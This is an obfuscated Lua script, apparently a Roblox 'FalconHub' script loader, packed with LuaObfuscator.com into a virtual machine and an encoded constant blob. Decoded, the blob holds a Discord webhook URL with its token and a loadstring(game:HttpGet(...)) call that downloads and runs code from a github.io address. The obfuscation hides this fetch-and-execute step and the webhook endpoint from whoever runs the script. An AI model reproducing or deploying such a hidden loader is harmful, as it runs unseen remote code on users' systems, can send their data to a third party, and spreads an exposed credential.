--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=0;local v69;while true do if (v68==0) then v69=v2(v0(v30,16));if v19 then local v88=v5(v69,v19);v19=nil;return v88;else return v69;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v70=0 -0 ;local v71;while true do if ((0 -(1637 -(1523 + 114)))==v70) then v71=(v31/((3 -1)^(v32-(2 -1))))%(2^(((v33-(620 -(555 + 64))) -(v32-(932 -(771 + 86 + 74)))) + (569 -(367 + 201)))) ;return v71-(v71%1) ;end end else local v72=927 -(214 + 713) ;local v73;while true do if ((0 -0)==v72) then v73=2^(v32-(1 + 0)) ;return (((v31%(v73 + v73))>=v73) and (1 + 0)) or (877 -(282 + 595)) ;end end end end local function v21()local v34=1065 -(68 + 997) ;local v35;while true do if (v34==(1270 -(226 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=118 -(32 + 85) ;end if (v34==(1 + 0 + 0)) then return v35;end end end local function v22()local v36,v37=v1(v16,v18,v18 + (959 -(892 + 65)) );v18=v18 + (4 -2) ;return (v37 * (472 -216)) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (184 -(67 + 113)) ;return (v41 * (12302277 + 4474939)) + (v40 * (120312 -54776)) + (v39 * (606 -(87 + 263))) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,3 -2 ,972 -(802 + 150) ) * ((5 -3)^(57 -25))) + v42 ;local v46=v20(v43,16 + (447 -(416 + 26)) ,1028 -(915 + 82) );local v47=((v20(v43,90 -58 )==1) and  -(1 + 0)) or (1 -0) ;if (v46==0) then if (v45==((3789 -2602) -(1069 + 118))) then return v47 * (0 -0) ;else v46=1 -0 ;v44=0 + 0 + 0 ;end elseif (v46==(3636 -1589)) then return ((v45==(0 + 0)) and (v47 * ((792 -(368 + 423))/(0 -(0 -0))))) or (v47 * NaN) ;end return v8(v47,v46-(1041 -((448 -(145 + 293)) + 8)) ) * (v44 + (v45/(2^(199 -(577 -(44 + 386)))))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(1486 -(998 + 488))) then return "";end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v66=1, #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 -0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(0 + 0)) then else local v74=0 + 0 ;while true do if (v74~=(0 -0)) then else v52=0;v53=nil;v74=1275 -(388 + 886) ;end if (v74~=(1 -0)) then else v51=1 + 0 ;break;end end end if (v51==2) then local v75=560 -(306 + 254) ;while true do if (v75==(1 + 0)) then v51=5 -2 ;break;end if (v75==0) then v56=nil;v57=nil;v75=1468 -(899 + 568) ;end end end if (v51~=(1 + 0)) then else local v76=0 -0 ;while true do if (v76==(603 -(268 + 335))) then v54=nil;v55=nil;v76=291 -(60 + 230) ;end if (v76~=1) then else v51=574 -(426 + 146) ;break;end end end if (v51~=(1 + 2)) then else v58=nil;while true do local v80=0;local v81;while true do if (v80==(1456 -(282 + 1174))) then v81=811 -(569 + 242) ;while true do if (v81==0) then local v105=0;local v106;while true do if (v105==0) then v106=0 -0 ;while true do if (v106==0) then if (v52~=(1 + 1)) then else local v113=0;while true do local v119=0;while true do if (v119==(1024 -(706 + 318))) then if (v113~=(1251 -(721 + 530))) then else local v120=1271 -(945 + 326) ;while true do if (v120==0) then for v149=1,v23() do local v150=0;local v151;local v152;while true do if (v150~=0) then else local v170=0 -0 ;local v171;while true do if (v170==(0 + 0)) then v171=700 -(271 + 429) ;while true do if (v171==1) then v150=1;break;end if ((0 + 0)==v171) then local v189=1500 -(1408 + 92) ;while true do if (v189==1) then v171=1087 -(461 + 625) ;break;end if (v189==0) then v151=1288 -(993 + 295) ;v152=nil;v189=1;end end end end break;end end end if (v150==1) then while true do if (v151==(0 + 0)) then v152=v21();if (v20(v152,1172 -(418 + 753) ,1)~=0) then else local v182=0;local v183;local v184;local v185;local v186;while true do if (v182==(1 + 0)) then local v192=0 + 0 ;local v193;while true do if (v192~=(0 + 0)) then else v193=0 + 0 ;while true do if (v193~=1) then else v182=531 -(406 + 123) ;break;end if (v193~=0) then else local v207=0;while true do if (0==v207) then v185=nil;v186=nil;v207=1;end if (v207==(1770 -(1749 + 20))) then v193=1 + 0 ;break;end end end end break;end end end if (v182==(1322 -(1249 + 73))) then v183=0;v184=nil;v182=1;end if (v182==2) then while true do if (v183~=0) then else local v195=0 + 0 ;local v196;local v197;while true do if (v195~=0) then else v196=1145 -(466 + 679) ;v197=nil;v195=1;end if (1==v195) then while true do if (v196==0) then v197=0;while true do if (v197==(0 -0)) then local v213=0 -0 ;while true do if (v213==0) then v184=v20(v152,2,3);v185=v20(v152,4,6);v213=1;end if (v213==(1901 -(106 + 1794))) then v197=1;break;end end end if ((1 + 0)~=v197) then else v183=1;break;end end break;end end break;end end end if (v183~=3) then else if (v20(v185,3,3)==(1 + 0)) then v186[4]=v58[v186[4]];end v53[v149]=v186;break;end if (v183~=2) then else local v199=0;local v200;while true do if (v199==0) then v200=0;while true do if ((0 -0)==v200) then local v209=0;while true do if ((0 -0)~=v209) then else if (v20(v185,1,115 -(4 + 110) )~=(585 -(57 + 527))) then else v186[2]=v58[v186[1429 -(41 + 1386) ]];end if (v20(v185,105 -(17 + 86) ,2)~=1) then else v186[3 + 0 ]=v58[v186[6 -3 ]];end v209=1;end if (1==v209) then v200=2 -1 ;break;end end end if (v200==(167 -(122 + 44))) then v183=5 -2 ;break;end end break;end end end if (v183==1) then local v201=0 -0 ;while true do if (v201==1) then v183=2;break;end if (v201==0) then local v208=0 + 0 ;while true do if (v208==1) then v201=1;break;end if (v208~=0) then else v186={v22(),v22(),nil,nil};if (v184==0) then local v211=0 -0 ;local v212;while true do if (v211==(65 -(30 + 35))) then v212=0 + 0 ;while true do if (v212==0) then v186[3]=v22();v186[4]=v22();break;end end break;end end elseif (v184==1) then v186[3]=v23();elseif (v184==(1259 -(1043 + 214))) then v186[11 -8 ]=v23() -(2^(1228 -(323 + 889))) ;elseif (v184~=(7 -4)) then else local v222=580 -(361 + 219) ;local v223;while true do if (v222~=0) then else v223=320 -(53 + 267) ;while true do if (v223==(0 + 0)) then v186[416 -(15 + 398) ]=v23() -((984 -(18 + 964))^16) ;v186[14 -10 ]=v22();break;end end break;end end end v208=1 + 0 ;end end end end end end break;end end end break;end end break;end end end for v153=1 + 0 ,v23() do v54[v153-(851 -(20 + 830)) ]=v28();end v120=1;end if (v120~=1) then else v113=1;break;end end end if (v113~=1) then else local v121=0 + 0 ;while true do if (v121==0) then for v155=1,v23() do v55[v155]=v23();end return v56;end end end break;end end end end if (v52==(127 -(116 + 10))) then local v114=0;local v115;local v116;while true do if (0==v114) then v115=0 + 0 ;v116=nil;v114=739 -(542 + 196) ;end if (1==v114) then while true do if (v115~=(0 -0)) then else v116=0;while true do if (v116==(1 + 1)) then v52=2 + 0 ;break;end if (v116~=(1 + 0)) then else local v144=0 -0 ;while true do if ((2 -1)~=v144) then else v116=2;break;end if (v144==(1551 -(1126 + 425))) then for v172=1,v57 do local v173=0;local v174;local v175;local v176;local v177;local v178;while true do if (v173==(405 -(118 + 287))) then v174=0;v175=nil;v173=3 -2 ;end if (v173~=2) then else v178=nil;while true do if (v174~=(1123 -(118 + 1003))) then else while true do if (v175==1) then v178=nil;while true do if (v176==0) then local v202=0 -0 ;local v203;while true do if (v202==(377 -(142 + 235))) then v203=0 -0 ;while true do if (v203==0) then local v210=0;while true do if (v210~=1) then else v203=1 + 0 ;break;end if (v210~=0) then else v177=v21();v178=nil;v210=1;end end end if (v203~=1) then else v176=978 -(553 + 424) ;break;end end break;end end end if (v176~=1) then else if (v177==(1 -0)) then v178=v21()~=0 ;elseif (v177==(2 + 0)) then v178=v24();elseif (v177==3) then v178=v25();end v58[v172]=v178;break;end end break;end if (0~=v175) then else local v194=0 + 0 ;while true do if ((1 + 0)==v194) then v175=1 + 0 ;break;end if (v194==(0 + 0)) then v176=0 -0 ;v177=nil;v194=2 -1 ;end end end end break;end if ((0 -0)==v174) then local v190=0 + 0 ;while true do if (v190~=1) then else v174=4 -3 ;break;end if (v190~=0) then else v175=0;v176=nil;v190=1;end end end if ((754 -(239 + 514))==v174) then local v191=0 + 0 ;while true do if (1==v191) then v174=1331 -(797 + 532) ;break;end if (0~=v191) then else v177=nil;v178=nil;v191=1 + 0 ;end end end end break;end if (1==v173) then v176=nil;v177=nil;v173=1 + 1 ;end end end v56[6 -3 ]=v21();v144=1;end end end if (v116==(1202 -(373 + 829))) then local v145=731 -(476 + 255) ;local v146;while true do if (v145==0) then v146=0;while true do if (v146==(1131 -(369 + 761))) then v116=1;break;end if (v146~=(0 + 0)) then else v57=v23();v58={};v146=1;end end break;end end end end break;end end break;end end end v106=1;end if (v106==(1 -0)) then v81=1 -0 ;break;end end break;end end end if (1~=v81) then else if (v52~=(238 -(64 + 174))) then else local v111=0;while true do if (0~=v111) then else local v112=0;while true do if (v112==1) then v111=1;break;end if (v112==(0 + 0)) then v53={};v54={};v112=1 -0 ;end end end if (v111==(337 -(144 + 192))) then v55={};v56={v53,v54,nil,v55};v111=2;end if (v111~=2) then else v52=1;break;end end end break;end end break;end end end break;end end end local function v29(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==1) then v65=v59[3];return function(...)local v82=0;local v83;local v84;local v85;local v86;local v87;while true do if (v82==3) then A,B=v27(v11(v87));if  not A[1] then local v99=0;local v100;while true do if (v99==0) then v100=v59[4][v83] or "?" ;error("Script error at ["   .. v100   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end break;end if (v82==1) then v85={...};v86=v12("#",...) -1 ;v82=2;end if (v82==0) then v83=1;v84= -1;v82=1;end if (v82==2) then v87=nil;function v87()local v89=v63;local v90=v64;local v91=v65;local v92=v27;local v93={};local v94={};local v95={};for v101=0 + 0 ,v86 do if ((v101>=v91) or ((1819 -(118 + 220))>=2658)) then v93[v101-v91 ]=v85[v101 + (1505 -(363 + 1141)) ];else v95[v101]=v85[v101 + (1581 -(1183 + 397)) ];end end local v96=(v86-v91) + 1 ;local v97;local v98;while true do local v102=0 -0 ;local v103;local v104;while true do if ((v102==(1 + 0)) or ((2407 + 813)==(3339 -(1913 + 62)))) then while true do if ((v103==(0 + 0 + 0)) or ((2789 -1735)>(5325 -(565 + (1817 -(108 + 341)))))) then v104=0 -0 ;while true do if ((v104==(1662 -(1477 + 184))) or (676>=1642)) then if (((5634 -1498)>(2234 + 163)) and (v98<=(861 -(564 + 132 + 160)))) then if ((v98<=(2 -0)) or (4334==(12795 -8550))) then if ((v98<=(304 -((1031 -787) + 60))) or ((3288 + (2481 -(711 + 782)))<=(3507 -(41 + 435)))) then v61[v97[(1924 -920) -(938 + 63) ]]=v95[v97[2 + 0 ]];elseif ((v98>((1595 -(270 + 199)) -(936 + 189))) or ((1574 + 3208)<=(2812 -(1565 + 48)))) then v95[v97[2 + 0 ]]=v61[v97[3]];else local v128=0;local v129;local v130;while true do if (((1138 -(782 + 356))==v128) or ((5131 -(176 + 91))<(4954 -3052))) then local v159=0 -0 ;while true do if (((1569 + 3270)>=(4792 -(975 + 117))) and (v159==0)) then v129=1875 -((1976 -(580 + 1239)) + 1718) ;v130=nil;v159=1 + 0 ;end if ((v159==(3 -2)) or ((3195 -2120)>(6557 -4639))) then v128=1019 -(697 + 321) ;break;end end end if (((1078 -682)<=(8059 -4255)) and (v128==(2 -1))) then while true do if ((v129==(0 + 0 + 0)) or ((7810 -3641)==2187)) then v130=v97[(1 + 4) -3 ];v95[v130]=v95[v130](v13(v95,v130 + 1 ,v84));break;end end break;end end end elseif (((2633 -(322 + 905))==((879 + 1138) -(602 + 9))) and (v98<=3)) then do return;end elseif (((2720 -(449 + 740))<(5143 -(826 + (119 -73)))) and (v98>(951 -(245 + 702)))) then v95[v97[6 -4 ]]();else v95[v97[1 + 1 ]][v97[(1182 + 719) -((1427 -(645 + 522)) + 1638) ]]=v97[444 -(382 + 58) ];end elseif (((2037 -1402)==635) and (v98<=(7 + 1))) then if (((6970 -(5387 -(1010 + 780)))<=3556) and (v98<=(17 -11))) then v95[v97[1207 -(902 + 303) ]]=v97[3]~=(0 -0) ;elseif ((v98==(16 -9)) or ((283 + 3008)<(4970 -(1121 + 569)))) then if (((4600 -(22 + 192))>=(1556 -(483 + 0 + 200))) and (v95[v97[1465 -(1404 + 59) ]]==v97[10 -6 ])) then v83=v83 + 1 ;else v83=v97[14 -11 ];end else v95[v97[2 -0 ]]=v97[768 -(468 + 297) ];end elseif (((1483 -(334 + 228))<=1102) and (v98<=(33 -23))) then if (((10907 -6201)>=(1746 -783)) and (v98>(3 + 6))) then if ((v97[238 -(141 + 95) ]==v95[v97[4 + 0 ]]) or ((2471 -1511)<=876)) then v83=v83 + (2 -(2 -1)) ;else v83=v97[3];end else local v135=0 + 0 ;local v136;local v137;local v138;local v139;while true do if ((v135==2) or ((5660 -3594)==(656 + 276))) then for v167=v136,v84 do local v168=(1836 -(1045 + 791)) + 0 ;local v169;while true do if ((4825<(6819 -(5001 -3025))) and (v168==(0 + 0))) then v169=163 -((139 -47) + 71) ;while true do if ((v169==(0 + 0)) or ((6517 -2640)>=4537)) then v139=v139 + (766 -(574 + 191)) ;v95[v167]=v137[v139];break;end end break;end end end break;end if ((v135==1) or ((3560 + 755)<1726)) then v84=(v138 + v136) -(2 -1) ;v139=0;v135=2 + 0 ;end if ((v135==((1354 -(351 + 154)) -(254 + 595))) or ((3805 -(55 + 71))<(822 -197))) then local v160=1790 -(573 + 1217) ;while true do if ((v160==(2 -(1575 -(1281 + 293)))) or ((352 + (4539 -(28 + 238)))<((2272 -1255) -385))) then v135=1;break;end if ((v160==(939 -(714 + 225))) or ((242 -159)>(2481 -(2260 -(1381 + 178))))) then v136=v97[2];v137,v138=v92(v95[v136](v13(v95,v136 + 1 + 0 ,v97[3 -0 ])));v160=1;end end end end end elseif (((1352 -(118 + 688))<=1077) and (v98==(59 -(25 + 22 + 1)))) then local v140=0 + 0 + 0 ;local v141;local v142;while true do if (((1887 -(927 + 959))==v140) or ((3357 -2361)>(5033 -(16 + 716)))) then v95[v141 + (1 -0) ]=v142;v95[v141]=v142[v97[101 -(11 + 86) ]];break;end if (((9927 -5857)>(972 -(75 + 100 + 110))) and (v140==((0 -0) -(0 + 0)))) then v141=v97[9 -7 ];v142=v95[v97[1799 -(503 + 1293) ]];v140=1;end end else v83=v97[8 -5 ];end v83=v83 + 1 ;break;end if ((v104==(0 + 0)) or ((1717 -(810 + 251))>=((2781 -(381 + 89)) + 1019))) then local v117=0;local v118;while true do if ((v117==(0 + 0)) or ((2247 + 245)<=(868 -(43 + 490)))) then v118=733 -(711 + 20 + 2) ;while true do if (((16718 -12396)>=(3421 -(240 + 619))) and (v118==(1 + 0))) then v104=1 -0 ;break;end if ((v118==(0 + 0)) or ((5381 -(1344 + 400))>=3770)) then local v125=405 -(255 + 150) ;while true do if ((v125==(0 + 0)) or ((862 + 412 + 1105)>(7841 -3263))) then v97=v89[v83];v98=v97[1];v125=4 -3 ;end if ((v125==(3 -(1158 -(1074 + 82)))) or ((2222 -((885 -481) + 1335))>(1149 -(183 + 223)))) then v118=1;break;end end end end break;end end end end break;end end break;end if (((2985 -531)>(383 + 195)) and (v102==(0 + (1784 -(214 + 1570))))) then v103=337 -(10 + 327) ;v104=nil;v102=1 + 0 ;end end end end v82=3;end end end;end if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!173O00028O00027O0040026O00F03F026O00084003023O005F47030A3O005365636F6E6454657874030B3O00457865637574696E672O2E03093O0054686972645465787403083O005374617274696E6703083O00557365724E616D65030B3O004C65616E6465723135373303073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313033303531373238392O303835332O38312F5F476277305767453633442O33304B436E755137347075787033626135545849766E6B62476946322D464D4E5836317A357072696A64475A4252586B356E486949692O6B030B3O0057616974696E6754696D65026O004E40030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F72692O7A36392E6769746875622E696F2F4D61696E2E6C7561030A3O005363726970744E616D6503093O0046616C636F6E48756203093O0046697273745465787403113O00536372697074204C6F6164696E673O2E003D3O0012083O00013O0026073O00100001000200040C3O00100001001208000100013O000E0A000300080001000100040C3O000800010012083O00043O00040C3O00100001002607000100040001000100040C3O00040001001202000200053O003004000200060007001202000200053O003004000200080009001208000100033O00040C3O000400010026073O001F0001000100040C3O001F0001001208000100013O002607000100170001000300040C3O001700010012083O00033O00040C3O001F0001002607000100130001000100040C3O001300010012080002000B3O00122O0002000A3O0012080002000D3O00122O0002000C3O001208000100033O00040C3O001300010026073O002C0001000400040C3O002C0001001202000100053O0030040001000E000F001202000100103O001202000200113O00200B000200020012001208000400134O0006000500014O0009000200054O000100013O00022O000500010001000100040C3O003C00010026073O00010001000300040C3O00010001001208000100013O002607000100330001000300040C3O003300010012083O00023O00040C3O000100010026070001002F0001000100040C3O002F0001001202000200053O003004000200140015001202000200053O003004000200160017001208000100033O00040C3O002F000100040C3O000100012O00033O00017O003D3O00023O00043O00043O00053O00073O00073O00083O00093O000B3O000B3O000C3O000C3O000D3O000D3O000E3O000F3O00123O00123O00133O00153O00153O00163O00173O00193O00193O001A3O001A3O001B3O001B3O001C3O001D3O00203O00203O00213O00213O00223O00223O00223O00223O00223O00223O00223O00223O00233O00253O00253O00263O00283O00283O00293O002A3O002C3O002C3O002D3O002D3O002E3O002E3O002F3O00303O00323O00343O00",v9(),...);end